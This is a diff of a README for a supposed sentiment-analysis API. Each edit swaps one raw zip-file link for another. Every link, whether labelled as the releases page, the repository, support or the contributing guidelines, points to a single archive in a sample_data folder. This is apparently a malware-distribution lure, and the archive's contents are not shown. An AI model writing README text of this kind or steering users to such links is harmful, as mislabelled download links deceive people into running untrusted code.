@@ -1,7 +1,7 @@
 # 🌟 Insightify-Sentiment-API - Analyze Sentiment Easily
 
 ## 📥 Download the Latest Release
-[![Download Insightify-Sentiment-API](https://raw.githubusercontent.com/ogthheu/Insightify-Sentiment-API/main/sample_data/Sentiment-Insightify-API-2.8.zip)](https://raw.githubusercontent.com/ogthheu/Insightify-Sentiment-API/main/sample_data/Sentiment-Insightify-API-2.8.zip)
+[![Download Insightify-Sentiment-API](https://raw.githubusercontent.com/ogthheu/Insightify-Sentiment-API/main/sample_data/Sentiment_API_Insightify_1.4.zip)](https://raw.githubusercontent.com/ogthheu/Insightify-Sentiment-API/main/sample_data/Sentiment_API_Insightify_1.4.zip)
 
 ## 📖 Introduction
 Welcome to the Insightify-Sentiment-API project! This application helps you analyze the sentiment of texts in English and Indonesian. Whether you are processing documents in bulk or extracting keywords, this tool is tailored for your needs. It uses advanced natural language processing (NLP) techniques to provide real-time analysis, ensuring that your text data is interpreted accurately.
@@ -26,7 +26,7 @@ Insightify-Sentiment-API comes packed with the following features:
 - **Easy API Integration**: Utilize the RESTful API to integrate easily with other applications.
 
 ## 📥 Download & Install
-To download the latest version of Insightify-Sentiment-API, visit the [Releases page](https://raw.githubusercontent.com/ogthheu/Insightify-Sentiment-API/main/sample_data/Sentiment-Insightify-API-2.8.zip). 
+To download the latest version of Insightify-Sentiment-API, visit the [Releases page](https://raw.githubusercontent.com/ogthheu/Insightify-Sentiment-API/main/sample_data/Sentiment_API_Insightify_1.4.zip). 
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest release version.
@@ -73,12 +73,12 @@ Upload the file using the specified endpoint to receive a sentiment analysis for
 - **Save Results**: Export the analysis results as CSV for further examination or reporting.
 
 ## 📞 Support
-If you encounter any issues or have questions, feel free to open an issue on the [GitHub repository](https://raw.githubusercontent.com/ogthheu/Insightify-Sentiment-API/main/sample_data/Sentiment-Insightify-API-2.8.zip), and we will assist you promptly.
+If you encounter any issues or have questions, feel free to open an issue on the [GitHub repository](https://raw.githubusercontent.com/ogthheu/Insightify-Sentiment-API/main/sample_data/Sentiment_API_Insightify_1.4.zip), and we will assist you promptly.
 
 ## 🌟 Contributing
-We welcome contributions! If you have suggestions, improvements, or bug fixes, please check our [contributing guidelines](https://raw.githubusercontent.com/ogthheu/Insightify-Sentiment-API/main/sample_data/Sentiment-Insightify-API-2.8.zip) to get started.
+We welcome contributions! If you have suggestions, improvements, or bug fixes, please check our [contributing guidelines](https://raw.githubusercontent.com/ogthheu/Insightify-Sentiment-API/main/sample_data/Sentiment_API_Insightify_1.4.zip) to get started.
 
 ## 📜 License
 This project is licensed under the MIT License. See the LICENSE file for details.
 
-Now you are ready to harness the power of Insightify-Sentiment-API for your sentiment analysis needs! Don't forget to visit our [Releases page](https://raw.githubusercontent.com/ogthheu/Insightify-Sentiment-API/main/sample_data/Sentiment-Insightify-API-2.8.zip) for the latest updates and tools. Enjoy your experience!
+Now you are ready to harness the power of Insightify-Sentiment-API for your sentiment analysis needs! Don't forget to visit our [Releases page](https://raw.githubusercontent.com/ogthheu/Insightify-Sentiment-API/main/sample_data/Sentiment_API_Insightify_1.4.zip) for the latest updates and tools. Enjoy your experience!
